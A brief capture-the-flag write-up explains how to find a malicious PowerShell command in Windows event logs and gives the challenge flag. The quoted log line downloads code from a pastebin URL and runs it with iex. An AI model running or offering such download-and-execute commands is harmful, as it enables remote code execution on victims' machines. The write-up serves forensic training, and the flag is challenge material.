# Dangerous Events

300 Points

Our team has been provided with some windows event logs.
Looks like someone tried to execute something malicious.
Can you find it?

### Solution

ON event ID 4104, we can see that we have some powershell command that is trying to download a file from pastebin and execute it.


```json
// line 11730
{   "EventID": 4104,
    "Message": "Executing PowerShell command: iwr -Uri https://pastebin.com/raw/w3B10p2h -UseBasicParsing | iex",
} 
```

flag:
`CSC25{C0mm4nd_&_COntr0I_4tt3MpT}`
